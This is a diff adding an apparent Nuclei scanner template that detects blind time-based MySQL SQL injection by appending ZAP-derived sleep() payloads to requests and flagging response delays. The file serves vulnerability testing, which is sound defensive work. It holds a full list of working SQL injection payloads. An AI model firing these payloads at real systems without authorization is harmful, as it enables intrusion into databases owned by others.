@@ -1,0 +1,56 @@
+id: mysql-blind-time-based-sqli
+
+info:
+  name: MySQL SQLi - Blind Time based
+  author: pdteam
+  severity: critical
+  reference:
+    - https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/SqlInjectionMySqlScanRule.java
+
+http:
+  # payloads taken from zap
+  - payloads:
+      injections:
+        low:
+          - " / sleep([SLEEPTIME]) "
+          - "' / sleep([SLEEPTIME]) / '"
+          - "\" / sleep([SLEEPTIME]) / \""
+          - " and 0 in (select sleep([SLEEPTIME]) ) -- "
+          - "' and 0 in (select sleep([SLEEPTIME]) ) -- "
+          - "\" and 0 in (select sleep([SLEEPTIME]) ) -- "
+        medium:
+          - " where 0 in (select sleep([SLEEPTIME]) ) -- "
+          - "' where 0 in (select sleep([SLEEPTIME]) ) -- "
+          - "\" where 0 in (select sleep([SLEEPTIME]) ) -- "
+          - " or 0 in (select sleep([SLEEPTIME]) ) -- "
+          - "' or 0 in (select sleep([SLEEPTIME]) ) -- "
+          - "\" or 0 in (select sleep([SLEEPTIME]) ) -- "
+          - " where 0 in (select sleep([SLEEPTIME]) ) "
+          - "' where 0 in (select sleep([SLEEPTIME]) ) and ''='"
+        high:
+          - "\" where 0 in (select sleep([SLEEPTIME]) ) and \"\"=\""
+          - " and 0 in (select sleep([SLEEPTIME]) ) "
+          - "' and 0 in (select sleep([SLEEPTIME]) ) and ''='"
+          - "\" and 0 in (select sleep([SLEEPTIME]) ) and \"\"=\""
+          - " or 0 in (select sleep([SLEEPTIME]) ) "
+          - "' or 0 in (select sleep([SLEEPTIME]) ) and ''='"
+          - "\" or 0 in (select sleep([SLEEPTIME]) ) and \"\"=\""
+          
+    attack: pitchfork
+    analyzer:
+      name: time_delay
+        
+    fuzzing:
+      - part: request
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injections}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: analyzer
+        words:
+          - "true"
